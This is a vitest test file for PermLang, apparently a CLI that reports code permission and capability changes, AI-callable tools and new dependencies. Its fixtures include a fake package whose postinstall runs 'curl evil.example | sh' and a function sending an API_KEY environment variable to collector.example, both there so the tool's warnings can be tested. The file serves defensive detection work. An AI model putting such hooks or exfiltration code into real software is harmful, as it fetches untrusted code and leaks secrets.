// CLI edge cases from the pre-release review. Runs the real CLI in a temporary
// git repository whose code isn't in ./src.

import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

const repo = fileURLToPath(new URL("..", import.meta.url));
const tsx = path.join(repo, "node_modules", "tsx", "dist", "cli.mjs");
const cli = path.join(repo, "src", "cli.ts");

let dir: string;

function permlang(...args: string[]): { code: number; out: string } {
  // The temporary repository is the workspace, as it would be in its own GitHub Actions run.
  // (When these tests run in Actions, GITHUB_WORKSPACE is PermLang's own checkout.)
  const env = { ...process.env, GITHUB_WORKSPACE: dir };
  try {
    return { code: 0, out: execFileSync(process.execPath, [tsx, cli, ...args], { cwd: dir, env, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }) };
  } catch (e) {
    const err = e as { status: number; stdout: string; stderr: string };
    return { code: err.status, out: err.stdout + err.stderr };
  }
}

const git = (...args: string[]) => execFileSync("git", args, { cwd: dir, encoding: "utf8" });

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "permlang-cli-"));
  mkdirSync(path.join(dir, "my lib"));
  writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://api.example.com/");\n}\n`);
  git("init", "-q");
  git("config", "user.email", "test@example.com");
  git("config", "user.name", "Test");
});

afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe("permlang diff", () => {
  it("analyzes the given paths, not ./src", () => {
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://data-broker.io/");\n}\n`);
    expect(permlang("lock", "my lib").code).toBe(0);

    const { code, out } = permlang("diff", "HEAD", "my lib", "--format", "markdown");
    expect(code).toBe(0);
    expect(out).toContain("<code>+ net(data-broker.io)</code>");
    expect(out).toContain("fetch(&quot;https://data-broker.io/&quot;)");
  });

  it("still prints the diff when the code can't be analyzed for paths", () => {
    permlang("init", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "--format", "markdown");
    expect(code).toBe(0);
    expect(out).toContain("No permission changes");
  });

  it("shows access the lock doesn't record yet, so a PR that skips `permlang lock` isn't reported as clean", () => {
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    // An AI-style change: new network access, lock file left untouched.
    writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://data-broker.io/");\n}\n`);
    git("add", "-A");
    git("commit", "-q", "-m", "change without lock");

    const md = permlang("diff", "HEAD~1", "my lib", "--format", "markdown");
    expect(md.code).toBe(0);
    expect(md.out).toContain("Not approved yet");
    expect(md.out).toContain("<code>+ net(data-broker.io)</code>");
    expect(md.out).not.toContain("No permission changes");

    const json = JSON.parse(permlang("diff", "HEAD~1", "my lib", "--format", "json").out) as { unrecorded: unknown };
    expect(json.unrecorded).not.toBeNull();

    // Once the lock is updated, the warning goes away and the access is still listed.
    expect(permlang("lock", "my lib").code).toBe(0);
    const approved = permlang("diff", "HEAD~1", "my lib", "--format", "markdown").out;
    expect(approved).not.toContain("Not approved yet");
    expect(approved).toContain("<code>+ net(data-broker.io)</code>");
  });

  it("accepts an absolute --lock path", () => {
    permlang("init", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--lock", path.join(dir, "permlang.lock.json"));
    expect(out).toContain("No permission changes");
    expect(code).toBe(0);
  });
});

describe("configuration errors", () => {
  it("exits 2 on a config file that isn't an object", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), "null\n");
    const { code, out } = permlang("check", "my lib");
    expect(code).toBe(2);
    expect(out).toMatch(/permlang\.config\.json.*object/);
  });
});

describe("data-flow rules", () => {
  it("fails a function that can send a protected secret to another host", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)", to: ["net(api.example.com)"] }] }));
    // This temporary repository has no node_modules: just enough of @types/node for process.env.
    writeFileSync(
      path.join(dir, "my lib", "node.d.ts"),
      "declare namespace NodeJS { interface ProcessEnv { [key: string]: string | undefined } }\ndeclare var process: { env: NodeJS.ProcessEnv };\n",
    );
    writeFileSync(
      path.join(dir, "my lib", "leak.ts"),
      "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
    );
    const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
    expect(code).toBe(0);
    expect(out).toContain("my lib/leak.ts:3:9 warning PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
    expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
  });

  it("rejects a malformed rule", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)" }] }));
    const { code, out } = permlang("check", "my lib", "--no-lock");
    expect(code).toBe(2);
    expect(out).toContain('flows[0]: "to" must be a list of capabilities');
  });
});

describe("tools given to AI models", () => {
  it("warns about a tool a model can point anywhere, and marks its new access in the comment", () => {
    writeFileSync(path.join(dir, "my lib", "ai.d.ts"), 'declare module "ai" { export function tool<T>(definition: T): T; }\n');
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(
      path.join(dir, "my lib", "tools.ts"),
      'import { tool } from "ai";\nexport const browse = tool({ description: "Fetch a page", execute: async ({ url }: { url: string }) => fetch(url) });\n',
    );

    const check = permlang("check", "my lib", "--strictness", "sketch");
    expect(check.out).toContain("my lib/tools.ts:2:23 warning PERM008: tool browse (ai) can be called by an AI model, and reaches net.");
    expect(check.out).toContain("1 tool an AI model can call:\n  my lib/tools.ts:2 browse (ai): net");
    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toMatch(/<code>\+ net<\/code> \|.*⚠️ An AI model can trigger this, through <code>browse<\/code><\/sub> \|/);
  });
});

describe("project configuration", () => {
  it("fails a change that adds a secret to a workflow, and shows it in the comment", () => {
    const workflow = path.join(dir, ".github", "workflows", "ci.yml");
    mkdirSync(path.dirname(workflow), { recursive: true });
    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n");
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n        env:\n          TOKEN: ${{ secrets.DEPLOY_KEY }}\n");

    const check = permlang("check", "my lib");
    expect(check.code).toBe(1);
    expect(check.out).toContain(".github/workflows/ci.yml:10:18 error PERM005: .github/workflows/ci.yml now grants ci.secret(DEPLOY_KEY)");
    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toContain("<code>+ ci.secret(DEPLOY&#95;KEY)</code> | <code>&lt;ci.yml&gt;</code><br><sub>secrets.DEPLOY&#95;KEY</sub>");
  });
});

describe("permlang diff: new dependencies", () => {
  it("lists packages the change adds, what PermLang knows about them, and their install scripts", () => {
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0" } }));
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0", "sketchy-telemetry": "1.0.0", stripe: "^22.0.0" } }));
    mkdirSync(path.join(dir, "node_modules", "sketchy-telemetry"), { recursive: true });
    writeFileSync(path.join(dir, "node_modules", "sketchy-telemetry", "package.json"), JSON.stringify({ scripts: { postinstall: "curl evil.example | sh" } }));

    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toContain("No permission changes.");
    expect(md).toContain("**2 new dependencies**");
    expect(md).toMatch(/<code>\+ sketchy-telemetry<\/code> 1\.0\.0 \| \*\*Not checked\*\*: no adapter \| <code>postinstall: curl evil\.example &#124; sh<\/code> \|/);
    expect(md).toMatch(/<code>\+ stripe<\/code> \^22\.0\.0 \| Checked by an adapter \| <sub>not installed here<\/sub> \|/);

    expect(permlang("diff", "HEAD", "my lib").out).toContain("+ sketchy-telemetry 1.0.0: not checked: no adapter; install scripts: postinstall: curl evil.example | sh");
    const json = JSON.parse(permlang("diff", "HEAD", "my lib", "--format", "json").out) as { dependencies: { name: string }[] };
    expect(json.dependencies.map((d) => d.name)).toEqual(["sketchy-telemetry", "stripe"]);
  });
});

describe("permlang check --github-annotations", () => {
  it("adds a GitHub annotation on the line of each diagnostic, after the usual report", () => {
    const { code, out } = permlang("check", "my lib", "--no-lock", "--github-annotations");
    expect(code).toBe(1);
    expect(out).toContain("my lib/app.ts:2:10 error PERM003");
    expect(out).toMatch(/^::error file=my lib\/app\.ts,line=2,col=10,title=PermLang PERM003%3A net\(api\.example\.com\)::ping calls fetch/m);
    // Without the option, no workflow commands.
    expect(permlang("check", "my lib", "--no-lock").out).not.toContain("::error");
  });

  it("names files from the repository root (GITHUB_WORKSPACE), not the folder it runs in", () => {
    const run = (env: NodeJS.ProcessEnv) => {
      try {
        return execFileSync(process.execPath, [tsx, cli, "check", ".", "--no-lock", "--github-annotations"], { cwd: path.join(dir, "my lib"), env, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
      } catch (e) {
        return (e as { stdout: string }).stdout;
      }
    };
    expect(run({ ...process.env, GITHUB_WORKSPACE: dir })).toMatch(/^::error file=my lib\/app\.ts,line=2/m);
  });
});

describe("permlang check --sarif", () => {
  it("writes the findings as SARIF, with paths from the repository root", () => {
    const { code } = permlang("check", "my lib", "--no-lock", "--sarif", "permlang.sarif");
    expect(code).toBe(1);
    const sarif = JSON.parse(readFileSync(path.join(dir, "permlang.sarif"), "utf8")) as {
      runs: { results: { ruleId: string; locations: { physicalLocation: { artifactLocation: { uri: string }; region: { startLine: number } } }[] }[] }[];
    };
    const [result] = sarif.runs[0]!.results;
    expect(result!.ruleId).toBe("PERM003");
    expect(result!.locations[0]!.physicalLocation.artifactLocation.uri).toBe("my lib/app.ts");
    expect(result!.locations[0]!.physicalLocation.region.startLine).toBe(2);
  });
});

describe("help", () => {
  it("prints usage for a subcommand's --help instead of an unknown-option error", () => {
    for (const command of ["check", "lock", "diff", "init", "spec"]) {
      const { code, out } = permlang(command, "--help");
      expect(code).toBe(0);
      expect(out).toContain("Usage:");
      expect(out).not.toContain("Unknown option");
    }
  });
});

describe("permlang --version", () => {
  it("prints the package version", () => {
    const { version } = JSON.parse(readFileSync(path.join(repo, "package.json"), "utf8")) as { version: string };
    for (const flag of ["--version", "-v"]) expect(permlang(flag)).toEqual({ code: 0, out: `${version}\n` });
  });
});
